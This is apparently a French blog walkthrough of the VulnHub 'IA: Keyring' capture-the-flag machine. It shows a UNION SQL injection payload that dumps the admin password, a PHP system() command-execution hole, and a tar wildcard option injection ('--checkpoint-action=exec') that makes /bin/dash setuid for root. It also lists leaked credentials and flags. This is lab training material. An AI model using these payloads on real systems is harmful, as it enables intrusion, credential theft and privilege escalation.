---
title: Solution du CTF IA Keyring de VulnHub
tags: [CTF, VulnHub]
---

### Pollution de CTF

Le CTF [IA: Keyring](https://vulnhub.com/entry/ia-keyring-101,718/) était intéressant. J'ai tout de même perdu du temps sur une fausse piste ainsi qu'une vraie vulnérabilité qui s'est avérée non exploitable.

```console
$ sudo nmap -T5 -p- 192.168.56.117
Starting Nmap 7.95 ( https://nmap.org )
Nmap scan report for 192.168.56.117
Host is up (0.00015s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:3B:14:6B (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.43 seconds
```

La base du site, c'est un simple formulaire d'enregistrement. On peut penser au début qu'on peut aussi se connecter, car il y a les boutons `login` et `signup`, mais le premier ne fait que rediriger vers la page courante.

Je commence par lancer Wapiti sur le site avec tous les modules. Au mieux, il trouvera une faille dans le système d'inscription, au pire, il me trouvera des fichiers supplémentaires :

```bash
wapiti -u http://192.168.56.117/ --color -m all
```

Je trouve une liste de scripts :

```
[*] Launching module buster
Found webpage http://192.168.56.117/index.php
Found webpage http://192.168.56.117/login.php
Found webpage http://192.168.56.117/home.php
Found webpage http://192.168.56.117/history.php
Found webpage http://192.168.56.117/logout.php
Found webpage http://192.168.56.117/about.php
Found webpage http://192.168.56.117/control.php
```

Ces scripts semblent nécessiter une authentification, sauf peut-être `history.php` qui me répond `can't find this user's activity`. J'ai tenté de brute-forcer des noms de paramètres, mais n'ai rien trouvé.

Par conséquence, j'ai créé un compte sur l'appli. Sur `control.php` on peut lire le message suivant :

> HTTP Parameter Pollution or HPP in short is a vulnerability that occurs due to passing of multiple parameters having same name

Seulement, peu de paramètres sont attendus par les scripts présents. J'ai tout de même tenté le doubler le paramètre `uname` sur le script de login dans l'espoir d'accèder au compte `admin` (le compte existe, car si on tente de l'enregistrer, on obtient une erreur).

C'est après pas mal d'errances que je me suis rendu compte que le script `history.php`, bien que retournant un message sans authentification, disposait d'un paramètre `user` non documenté qui n'était traité que si on était connecté.

Pour le trouver, j'ai juste testé quelques paramètres "à la main". `uname` me semblait plus prometteur, car c'est le terme utilisé dans les autres scripts. L'important, c'est d'avancer.

Ainsi la page `http://192.168.56.117/history.php?user=admin`retournait ce message :

```
Pages visited by user admin

https://github.com/cyberbot75/keyring
```

Le répo Github existe bien, et on trouve le code source de l'application.

J'avais toujours la tête dans le guidon à propos de cette histoire de HPP donc j'ai fouillé d'abord cette piste.

On peut retourner sur le script `control.php` qui est visiblement l'objectif en raison du RCE présent :

```php
<?php
session_start();
if(isset($_SESSION['name']))
{
        $servername = "localhost";
        $username = "root";
        $password = "sqluserrootpassw0r4";
        $database = "users";

        $conn = mysqli_connect($servername, $username, $password, $database);
        $name = $_SESSION['name'];
        $date =  date('Y-m-d H:i:s');
        echo "HTTP Parameter Pollution or HPP in short is a vulnerability that occurs<br>due to passing of multiple parameters having same name";
        $sql = "insert into log (name , page_visited , date_time) values ('$name','control','$date')";

                if(mysqli_query($conn,$sql))
                {
                                echo "<br><br>";
                                echo "Date & Time : ".$date;
                }
                system($_GET['cmdcntr']); //system() function is not safe to use , dont' forget to remove it in production .
}
else
{
        header('Location: index.php');
}
?>
```

À regarder ce code, on a l'impression qu'il suffit de passer le paramètre `cmdcntr` et c'est gagné. En vrai, on doit plutôt être proche de [cette version](https://github.com/cyberbot75/keyring/blob/1a772923c80cb07d621d6e654a4e78819126e0a9/html/control.php#L55) qui s'assure que l'utilisateur est `admin`.

Le nom d'utilisateur provenant de l'objet `$_SESSION`, on doit se tourner vers le script de login pour savoir comment c'est remplit :

```php
$us  = mysqli_real_escape_string($conn,$_POST['uname']);
$pa  = mysqli_real_escape_string($conn,$_POST['upass']);
$sql = "select name from details where name='$us' and password='$pa'";
$res = mysqli_query($conn,$sql);

if(mysqli_num_rows($res)>0)
{
        while($row = mysqli_fetch_assoc($res))
        {
              $_SESSION['name'] = $row['name'];
              header('Location: home.php');
        }
}
```

Bon, le script est bizarre avec sa boucle qui écrit dans `$_SESSION`, mais il est secure.

Voyons voir si on peut créer deux utilisateurs `admin` avec le script `index.php` :

```php
$us  = mysqli_real_escape_string($conn,$_POST['uname']);
$pa  = mysqli_real_escape_string($conn,$_POST['upass']);
$sql = "insert into details (name,password) values('$us','$pa')";
if (mysqli_query($conn,$sql))
{
        echo "<script>alert('User registered successfully')</script>";
}
else
{
        echo "<script>alert('User already registered!')</script>";
}
```

Là encore, c'est secure et comme vu plus tôt, on avait un message spécifique si on tentait d'enregistrer `admin`.

### Second-order tombe à l'eau

Les autres scripts ont tous une fonctionnalité de surveillance de l'activité des utilisateurs. Ça ressemble à ceci :

```php
$name = $_SESSION['name'];                                                                                         
$date =  date('Y-m-d H:i:s');                                                                                      
                                                                                                                       
$sql = "insert into log (name , page_visited , date_time) values ('$name','home','$date')";
```

Cette fois, on a une vraie vulnérabilité, une second-order injection !

À la création, notre nom d'utilisateur sera enregistré proprement, mais ces scripts l'extraient pour l'utiliser de la mauvaise façon, permettant une injection.

Mon idée est alors d'injecter des données dans la requête pour obtenir quelque chose comme ça :

```sql
INSERT INTO log (name, page_visited, date_time) VALUES ('yolo', (SELECT password FROM details WHERE name='admin'), 0); -- ','home','$date')";
```

Et ainsi, quand j'accèderai à `history.php` (qui dump la table `log`), je retrouverais le mot de passe de `admin`. Ouais, ça va être bien.

Malheureusement l'exploitation a échoué. C'est ce que je craignais : le nom d'utilisateur est limité dans la taille. J'ai effectué des tests simples en répétant le même caractère et j'ai compris que la limite était de 20 caractères.

### Il a été bénit par la grâce

J'ai finalement eu la révélation que `history.php` était lui-même vulnérable à une injection SQL. Son code n'est pas présent sur Github mais un test simple permettait de s'en assurer.

J'ai pu dumper facilement le mot de passe en passant cette valeur pour `user` :

```
' union select password from details where name='admin' #
```

Et j'ai ainsi obtenu :

```
Pages visited by user ' union select password from details where name='admin' #

myadmin#p4szw0r4d
```

A l'aide de ce mot de passe, on peut se connecter en admin à l'application web, et donc accéder à l'exécution de commande.

Une fois un shell obtenu, je trouve un autre utilisateur dans la table SQL :

```sql
mysql> select password from details where name="john";
+-----------------------+
| password              |
+-----------------------+
| Sup3r$S3cr3t$PasSW0RD |
+-----------------------+
1 row in set (0.28 sec)
```

J'aurais pu gagner du temps en dumpant toute la base plus tôt.

Cet utilisateur a un binaire setuid dans son dossier personnel :

```console
john@keyring:~$ ls -al
total 48
drwxr-x--- 3 john john  4096 Jun 30 19:34 .
drwxr-xr-x 3 root root  4096 Jun  7  2021 ..
lrwxrwxrwx 1 john john     9 Jun 20  2021 .bash_history -> /dev/null
-rw-r--r-- 1 john john   220 Jun  7  2021 .bash_logout
-rw-r--r-- 1 john john  3771 Jun  7  2021 .bashrc
-rwsr-xr-x 1 root root 16784 Jun 20  2021 compress
drwx------ 3 john john  4096 Jun 30 19:34 .gnupg
-rw-r--r-- 1 john john   807 Jun  7  2021 .profile
-rw-rw-r-- 1 john john   192 Jun 20  2021 user.txt
john@keyring:~$ cat user.txt

[ Keyring - User Owned ]
----------------------------------------------
Flag : VEhNe0Jhc2hfMXNfRnVuXzM4MzEzNDJ9Cg==
----------------------------------------------
by infosecarticles with <3
```

Le binaire n'a pas de message d'aide, mais semble créer une archive tar avec les fichiers du dossier courant :

```console
john@keyring:~$ ./compress -h
john@keyring:~$ ls
archive.tar  compress  user.txt
john@keyring:~$ tar vtf archive.tar 
-rwsr-xr-x root/root     16784 2021-06-20 11:25 compress
-rw-rw-r-- john/john       192 2021-06-20 14:24 user.txt
```

La commande `strings` n'est pas présente, mais on peut utiliser `grep` pour voir ce qu'il fait :

```console
john@keyring:~$ grep -a -o '[[:print:]]\+' compress | grep tar
__libc_start_main
__gmon_start__
/bin/tar cf archive.tar *
tar.c
__init_array_start
__libc_start_main@@GLIBC_2.2.5
__data_start
__gmon_start__
__bss_start
```

Le path de `tar` est absolu, pas d'exploitation de ce côté-là.

Par défaut, `tar` ne suit pas les liens symboliques.

```console
john@keyring:~$ ln -s /etc/shadow shadow
john@keyring:~$ ./compress 
john@keyring:~$ tar vtf archive.tar 
-rwsr-xr-x root/root     16784 2021-06-20 11:25 compress
lrwxrwxrwx john/john         0 2025-06-30 19:39 shadow -> /etc/shadow
-rw-rw-r-- john/john       192 2021-06-20 14:24 user.txt
```

### Lucky Star

On pourrait sans doute tricher là dessus, mais on va plutôt procéder à une injection d'option similaire au CTF [/dev/random: Pipe]({% link _posts/2017-11-17-Solution-du-CTF-devrandom-Pipe-de-VulnHub.md _%}).

J'ai d'abord créé un script `evil.sh` puis nommé quelques fichiers après des options. Quand je lance `compress`, le binaire lance `tar` depuis `bash`. Ce dernier voit la présence du caractère `*` dans la commande `/bin/tar cf archive.tar *` et va remplacer le caractère par les fichiers présents. Certains noms correspondant à des options, `tar` les interprète comme tel :

```console
john@keyring:~$ cat evil.sh 
#!/bin/bash
chmod 4755 /bin/dash
john@keyring:~$ touch -- "--checkpoint=1"; touch -- "--checkpoint-action=exec=sh evil.sh"
john@keyring:~$ ./compress 
john@keyring:~$ ls -al /bin/dash 
-rwsr-xr-x 1 root root 121432 Jan 25  2018 /bin/dash
john@keyring:~$ dash -p
# id
uid=1000(john) gid=1000(john) euid=0(root) groups=1000(john),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd),113(lpadmin),114(sambashare)
# cd /root
# ls
root.txt
# cat root.txt

[ Keyring - Rooted ]
---------------------------------------------------
Flag : VEhNe0tleXIxbmdfUjAwdDNEXzE4MzEwNTY3fQo=
---------------------------------------------------
by infosecarticles with <3
```
